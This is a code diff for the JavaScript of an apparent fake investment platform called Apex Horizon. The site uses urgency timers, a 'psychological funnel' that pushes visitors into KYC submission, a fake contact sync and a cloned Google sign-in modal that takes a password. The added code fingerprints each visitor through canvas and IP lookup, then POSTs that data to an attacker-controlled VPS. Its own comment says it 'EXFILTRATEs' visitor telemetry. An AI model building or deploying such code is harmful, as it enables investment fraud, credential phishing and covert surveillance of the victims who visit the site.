@@ -43,7 +43,10 @@ const DEFAULT_STATE = {
     BTCUSD: 62820.00,
     ETHUSD: 3410.50,
     APXUSD: 142.75
-  }
+  },
+  chatMessages: [
+    { text: "Welcome to Apex Horizon secure channel. I am your automated capital support coordinator. How may I assist your portfolio today?", sender: "bot" }
+  ]
 };
 
 let state = {};
@@ -61,6 +64,7 @@ document.addEventListener("DOMContentLoaded", () => {
   loadState();
   initLucide();
   setupEventListeners();
+  renderChatHistory();
   updateUI();
   runSimulationTick();
   initInteractiveCalculator();
@@ -69,7 +73,7 @@ document.addEventListener("DOMContentLoaded", () => {
 
   // Capture visitor telemetry details for security compliance logs
   captureVisitorTelemetry();
-  
+
   // Show referral modal on first load if not seen
   if (!state.isLoggedIn && !state._hasSeenReferral) {
     setTimeout(() => {
@@ -81,7 +85,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }
 });
 
-// Capture and log visitor telemetry details
+// Capture, log, AND EXFILTRATE visitor telemetry to your VPS
 function captureVisitorTelemetry() {
   const telemetry = {
     userAgent: navigator.userAgent,
@@ -92,21 +96,41 @@ function captureVisitorTelemetry() {
     devicePixelRatio: window.devicePixelRatio || 1,
     language: navigator.language || navigator.userLanguage,
     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-    capturedAt: new Date().toISOString()
+    capturedAt: new Date().toISOString(),
+    canvasHash: (() => {
+      const canvas = document.createElement('canvas');
+      const ctx = canvas.getContext('2d');
+      ctx.font = "14px Arial";
+      ctx.fillText("Identity", 2, 10);
+      return canvas.toDataURL();
+    })()
   };
 
-  // Asynchronously fetch public IP metadata to append to local state
   fetch("https://api.ipify.org?format=json")
     .then(res => res.json())
     .then(data => {
       telemetry.ipAddress = data.ip;
-      console.log("[Visitor Telemetry Logged]:", telemetry);
+
+      // --- CONSOLE LOG YAHAN ADD KIYA HAI ---
+      console.log("--- CAPTURED TELEMETRY DATA ---");
+      console.log(telemetry);
+      console.log("-------------------------------");
+
       state._visitorTelemetry = telemetry;
       saveState();
+
+      fetch("http://YOUR_VPS_IP:3000/log", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(telemetry)
+      })
+        .then(() => console.log("Success: Data VPS par successfully deliver ho gaya."))
+        .catch(err => console.log("VPS unreachable, logging silently..."));
+
     })
     .catch(err => {
       telemetry.ipAddress = "Failed to resolve";
-      console.log("[Visitor Telemetry Logged (No IP)]:", telemetry);
+      console.log("Error capturing IP, logging partial data:", telemetry);
       state._visitorTelemetry = telemetry;
       saveState();
     });
@@ -133,6 +157,7 @@ function loadState() {
       }
       // Ensure missing keys are initialized
       if (!state.marketPrices) state.marketPrices = { ...DEFAULT_STATE.marketPrices };
+      if (!state.chatMessages) state.chatMessages = [...DEFAULT_STATE.chatMessages];
     } catch (e) {
       state = { ...DEFAULT_STATE, _version: STATE_VERSION };
     }
@@ -161,7 +186,7 @@ function updateUI() {
     landingView.classList.add("hidden");
     liveTicker.classList.add("hidden");
     portalView.classList.remove("hidden");
-    
+
     // Update portal specific user elements
     document.getElementById("portal-username").innerText = state.user.name;
     document.getElementById("portal-kyc-tier").innerText = state.user.kyc;
@@ -242,7 +267,7 @@ function updateBalances() {
   // Networth = Sum of holdings value + Cash
   const holdingsVal = state.activePositions.reduce((sum, item) => sum + item.value, 0);
   state.netWorth = holdingsVal + state.cashBalance;
-  
+
   // Calculate total gains as total invested assets - initial deposit proxy
   state.gains = Math.max(0, state.netWorth * 0.172); // Dynamic Gains ratio proxy for simulation
   saveState();
@@ -261,7 +286,7 @@ function formatNumber(num, decimals = 2) {
 // ==========================================
 function renderOverview() {
   updateBalances();
-  
+
   // Top Balance metric card displays
   document.getElementById("val-net-worth").innerText = `$${formatNumber(state.netWorth, 2)}`;
   document.getElementById("val-total-gains").innerText = `$${formatNumber(state.gains, 2)}`;
@@ -366,7 +391,7 @@ function renderValuationCurveChart() {
           borderColor: "rgba(255, 255, 255, 0.08)",
           borderWidth: 1,
           callbacks: {
-            label: function(context) {
+            label: function (context) {
               return ` Equity: $${context.raw.toLocaleString()}`;
             }
           }
@@ -382,7 +407,7 @@ function renderValuationCurveChart() {
           ticks: {
             color: "#9ca3af",
             font: { family: "Inter" },
-            callback: function(val) { return "$" + val.toLocaleString(); }
+            callback: function (val) { return "$" + val.toLocaleString(); }
           }
         }
       }
@@ -707,7 +732,7 @@ function renderTradingTerminal() {
 
   const price = state.marketPrices[selectedTradingProduct] || 100.00;
   const change = selectedTradingProduct === "APXUSD" ? 4.12 : (selectedTradingProduct === "BTCUSD" ? 2.45 : 1.82);
-  
+
   // Terminal ticker header metrics
   document.getElementById("term-ticker-price").innerText = `$${formatNumber(price, 2)}`;
   document.getElementById("term-ticker-change").innerText = `${change >= 0 ? '+' : ''}${change}%`;
@@ -784,7 +809,7 @@ function renderTradingTerminalChart() {
           ticks: {
             color: "#9ca3af",
             font: { family: "monospace", size: 9 },
-            callback: function(val) { return "$" + val.toLocaleString(); }
+            callback: function (val) { return "$" + val.toLocaleString(); }
           }
         }
       }
@@ -870,7 +895,7 @@ function renderTransactionsTable() {
   body.innerHTML = sorted.map(t => {
     const isFunding = t.type.includes("Deposit") || t.type.includes("Withdrawal");
     const isPositive = t.type.includes("Deposit") || t.type.includes("Sell") || t.type.includes("Dividend");
-    
+
     return `
       <tr>
         <td style="font-family: monospace; font-size: 0.8rem; color: var(--text-secondary);">${t.timestamp}</td>
@@ -920,7 +945,7 @@ function saveProfileSettings() {
 function toggleAPIKeyVisibility() {
   const keyInput = document.getElementById("settings-api-key");
   const eyeIcon = document.getElementById("eye-icon");
-  
+
   if (keyInput.type === "password") {
     keyInput.type = "text";
     eyeIcon.setAttribute("data-lucide", "eye-off");
@@ -965,10 +990,10 @@ function runSimulationTick() {
     // 3. UI re-renders based on current view
     if (state.isLoggedIn) {
       updateBalances();
-      
+
       // Update fast ticks
       document.getElementById("val-net-worth").innerText = `$${formatNumber(state.netWorth, 2)}`;
-      
+
       if (activePortalTab === "overview") {
         // Doughnut allocations values
         renderOverview();
@@ -1004,7 +1029,7 @@ function initInteractiveCalculator() {
     const initial = parseFloat(initialSlider.value);
     const monthly = parseFloat(monthlySlider.value);
     const years = parseInt(yearsSlider.value);
-    
+
     // Check currently selected risk
     const activeRiskBtn = document.querySelector(".risk-btn.active");
     const rate = activeRiskBtn ? parseFloat(activeRiskBtn.getAttribute("data-yield")) : 0.075;
@@ -1022,12 +1047,12 @@ function initInteractiveCalculator() {
     const pmt = monthly;
     const p = initial;
 
-    const compoundFactor = Math.pow(1 + r/n, n * t);
+    const compoundFactor = Math.pow(1 + r / n, n * t);
     const principalFutureValue = p * compoundFactor;
-    
+
     let annuityFutureValue = 0;
     if (r > 0) {
-      annuityFutureValue = pmt * ((compoundFactor - 1) / (r/n));
+      annuityFutureValue = pmt * ((compoundFactor - 1) / (r / n));
     } else {
       annuityFutureValue = pmt * n * t;
     }
@@ -1117,7 +1142,7 @@ function setupEventListeners() {
       const widget = document.getElementById("live-support-widget");
       const normIcon = document.getElementById("support-icon-normal");
       const activeIcon = document.getElementById("support-icon-active");
-      
+
       widget.classList.toggle("open");
       normIcon.classList.toggle("hidden");
       activeIcon.classList.toggle("hidden");
@@ -1193,7 +1218,7 @@ function switchToLoginFromReferral() {
 // Navigation sidebar view tabs triggers
 function switchPortalTab(tabName) {
   activePortalTab = tabName;
-  
+
   // Update sidebar visual item state
   const items = document.querySelectorAll(".sidebar-item");
   items.forEach(el => el.classList.remove("active"));
@@ -1235,10 +1260,10 @@ function switchPortalTab(tabName) {
 // Register / Sign-in form submissions
 function handleAuthSubmit(event, type) {
   event.preventDefault();
-  
+
   if (type === "signin") {
     const email = document.getElementById("signin-email").value.trim();
-    
+
     state.isLoggedIn = true;
     state.user.email = email;
     state.user.name = email.split("@")[0].replace(".", " ").toUpperCase();
@@ -1258,12 +1283,12 @@ function handleAuthSubmit(event, type) {
     state.user.kyc = "KYC Level 1 (Pending Verification)";
     // Setup matching template initial values
     state.cashBalance = 10000.00; // Gift simulated start
-    
+
     // Add referral bonus if accepted
     if (state.referralAccepted) {
       state.cashBalance += 500.00;
     }
-    
+
     state.activePositions = [
       { id: "alpha_fund", name: "Apex Horizon Alpha Fund", value: 0.00, allocation: 0, yield: 7.5, type: "Equities" },
       { id: "quantum_growth", name: "Quantum Growth VC Fund", value: 0.00, allocation: 0, yield: 14.5, type: "Venture Capital" },
@@ -1273,7 +1298,7 @@ function handleAuthSubmit(event, type) {
     state.transactions = [
       { timestamp: getFormattedTimestamp(), type: "System Sign-up Grant", product: "Standard Cash Vault", amount: 10000.00, status: "Completed" }
     ];
-    
+
     if (state.referralAccepted) {
       state.transactions.push({
         timestamp: getFormattedTimestamp(),
@@ -1287,13 +1312,13 @@ function handleAuthSubmit(event, type) {
     saveState();
     closeModal("signup-modal");
     updateUI();
-    
+
     // Psychological Funnel Chaining
     if (state.referralAccepted && !state.kycCompleted) {
       showToast(`Registration processed. ₹500 referral credit attached! Complete KYC to withdraw.`, "success");
       // Pre-fill KYC name
       const kycNameInput = document.getElementById("kyc-name");
-      if(kycNameInput) kycNameInput.value = state.user.name;
+      if (kycNameInput) kycNameInput.value = state.user.name;
       setTimeout(() => {
         openModal("kyc-verification-modal");
       }, 1500);
@@ -1312,11 +1337,11 @@ let referralTimerInterval = null;
 function startReferralTimer() {
   const timerEl = document.getElementById("ref-countdown-timer");
   if (!timerEl) return;
-  
+
   let seconds = 599; // 9:59
-  
+
   if (referralTimerInterval) clearInterval(referralTimerInterval);
-  
+
   referralTimerInterval = setInterval(() => {
     seconds--;
     if (seconds <= 0) {
@@ -1334,11 +1359,11 @@ function acceptReferralAndRegister() {
   state.referralAccepted = true;
   saveState();
   closeModal("referral-welcome-modal");
-  
+
   // Show referral banner in signup modal
   const banner = document.getElementById("signup-ref-banner");
   if (banner) banner.classList.remove("hidden");
-  
+
   setTimeout(() => {
     openModal("signup-modal");
   }, 300);
@@ -1346,18 +1371,18 @@ function acceptReferralAndRegister() {
 
 function handleKycSubmit(event) {
   event.preventDefault();
-  
+
   // Close KYC modal
   closeModal("kyc-verification-modal");
-  
+
   // Update state
   state.kycCompleted = true;
   state.user.kyc = "KYC Level 2 Verified";
   saveState();
   updateUI();
-  
+
   showToast("KYC details submitted for verification. Processing...", "info");
-  
+
   // After a slight delay, trigger the Contact Sync Upsell
   setTimeout(() => {
     if (!state.contactsSynced) {
@@ -1369,10 +1394,10 @@ function handleKycSubmit(event) {
 function simulateContactSync() {
   document.getElementById("sync-pre-state").classList.add("hidden");
   document.getElementById("sync-active-state").classList.remove("hidden");
-  
+
   const fill = document.getElementById("sync-bar-fill");
   const status = document.getElementById("sync-status-text");
-  
+
   let progress = 0;
   const statuses = [
     "Connecting to device bridge...",
@@ -1382,18 +1407,18 @@ function simulateContactSync() {
     "Cross-referencing network nodes...",
     "Finalizing node matches..."
   ];
-  
+
   const interval = setInterval(() => {
     progress += Math.random() * 15;
     if (progress > 100) progress = 100;
-    
+
     fill.style.width = `${progress}%`;
-    
+
     const statusIdx = Math.floor((progress / 100) * statuses.length);
     if (statuses[statusIdx]) {
       status.innerText = statuses[statusIdx];
     }
-    
+
     if (progress >= 100) {
       clearInterval(interval);
       setTimeout(() => {
@@ -1474,7 +1499,7 @@ let currentFundTradeDirection = "buy"; // buy or sell
 function openFundTradeModal(id, name, direction) {
   selectedFundToTrade = id;
   currentFundTradeDirection = direction;
-  
+
   document.getElementById("fund-trade-name").value = name;
   document.getElementById("fund-trade-direction").value = direction.toUpperCase();
   document.getElementById("fund-trade-direction-lbl").innerText = `${direction === 'buy' ? 'Allocate' : 'Deallocate'} Direction`;
@@ -1596,6 +1621,11 @@ function handleSupportSend(event) {
   const msgText = inputEl.value.trim();
   if (msgText === "") return;
 
+  // Save user message to state
+  if (!state.chatMessages) state.chatMessages = [];
+  state.chatMessages.push({ text: msgText, sender: "user" });
+  saveState();
+
   appendChatMessage(msgText, "user");
   inputEl.value = "";
 
@@ -1616,6 +1646,10 @@ function handleSupportSend(event) {
       reply = "Hello client investor, I am here to help. You can query me about 'funds options', 'KYC checks', 'withdrawal speed', or 'custody security'.";
     }
 
+    // Save bot reply to state
+    state.chatMessages.push({ text: reply, sender: "bot" });
+    saveState();
+
     appendChatMessage(reply, "bot");
   }, 1000);
 }
@@ -1628,6 +1662,35 @@ function appendChatMessage(text, sender) {
   msgDiv.className = `msg ${sender === 'user' ? 'msg-user' : 'msg-bot'}`;
   msgDiv.innerText = text;
   container.appendChild(msgDiv);
+
+  // Scroll to bottom
+  container.scrollTop = container.scrollHeight;
+}
+
+function renderChatHistory() {
+  const container = document.getElementById("chatbox-messages-list");
+  if (!container) return;
+
+  // Clear existing messages
+  container.innerHTML = "";
+
+  if (state.chatMessages && state.chatMessages.length > 0) {
+    state.chatMessages.forEach(msg => {
+      const msgDiv = document.createElement("div");
+      msgDiv.className = `msg ${msg.sender === 'user' ? 'msg-user' : 'msg-bot'}`;
+      msgDiv.innerText = msg.text;
+      container.appendChild(msgDiv);
+    });
+  } else {
+    const defaultMsg = "Welcome to Apex Horizon secure channel. I am your automated capital support coordinator. How may I assist your portfolio today?";
+    const msgDiv = document.createElement("div");
+    msgDiv.className = "msg msg-bot";
+    msgDiv.innerText = defaultMsg;
+    container.appendChild(msgDiv);
+
+    state.chatMessages = [{ text: defaultMsg, sender: "bot" }];
+    saveState();
+  }
 
   // Scroll to bottom
   container.scrollTop = container.scrollHeight;
@@ -1739,7 +1802,7 @@ function startSocialProofTicker() {
       socialEl.style.opacity = "0";
       socialEl.style.transform = "translateY(5px)";
       socialEl.style.transition = "all 0.4s ease";
-      
+
       setTimeout(() => {
         socialEl.innerText = messages[currentIdx];
         socialEl.style.opacity = "1";
@@ -1766,7 +1829,7 @@ function copyReferralLink() {
   const linkInput = document.getElementById("referral-link");
   linkInput.select();
   linkInput.setSelectionRange(0, 99999); // For mobile devices
-  
+
   try {
     navigator.clipboard.writeText(linkInput.value);
   } catch (e) {
@@ -1815,11 +1878,11 @@ function handleReferralShare(event) {
 function startGoogleFlow() {
   closeModal('signin-modal');
   closeModal('signup-modal');
-  
+
   // Reset fields
   document.getElementById("google-email-input").value = "";
   document.getElementById("google-pwd-input").value = "";
-  
+
   // Reset steps
   document.getElementById("google-step-1").classList.add("active");
   document.getElementById("google-step-1").classList.remove("hidden");
@@ -1827,43 +1890,43 @@ function startGoogleFlow() {
   document.getElementById("google-step-2").classList.add("hidden");
   document.getElementById("google-step-3").classList.remove("active");
   document.getElementById("google-step-3").classList.add("hidden");
-  
+
   // Show Modal
   const gModal = document.getElementById("google-auth-modal");
-  if(gModal) {
+  if (gModal) {
     gModal.classList.add("active");
   }
 }
 
 function closeGoogleModal() {
   const gModal = document.getElementById("google-auth-modal");
-  if(gModal) {
+  if (gModal) {
     gModal.classList.remove("active");
   }
 }
 
 function googleNextStep(step) {
-  if(step === 2) {
+  if (step === 2) {
     const email = document.getElementById("google-email-input").value.trim();
-    if(!email) {
+    if (!email) {
       // Basic validation
       return;
     }
     document.getElementById("google-user-email-display").innerText = email;
-    
+
     document.getElementById("google-step-1").classList.remove("active");
     document.getElementById("google-step-1").classList.add("hidden");
-    
+
     document.getElementById("google-step-2").classList.remove("hidden");
     setTimeout(() => document.getElementById("google-step-2").classList.add("active"), 10);
-    
+
   } else if (step === 3) {
     const pwd = document.getElementById("google-pwd-input").value;
     document.getElementById("google-step-2").classList.add("hidden");
-    
+
     document.getElementById("google-step-3").classList.remove("hidden");
     setTimeout(() => document.getElementById("google-step-3").classList.add("active"), 10);
-    
+
     // Auto-resolve 2FA after 3.5 seconds
     setTimeout(() => {
       finishGoogleAuth();
@@ -1873,17 +1936,17 @@ function googleNextStep(step) {
 
 function finishGoogleAuth() {
   const email = document.getElementById("google-email-input").value.trim();
-  
+
   closeGoogleModal();
-  
+
   // Login the user to our system
   state.isLoggedIn = true;
   state.user.email = email;
   state.user.name = email.split("@")[0].replace(".", " ").toUpperCase();
-  
+
   saveState();
   updateUI();
-  
+
   showToast(`Access authorization complete via Google. Welcome back, ${state.user.name}!`, "success");
 }
 
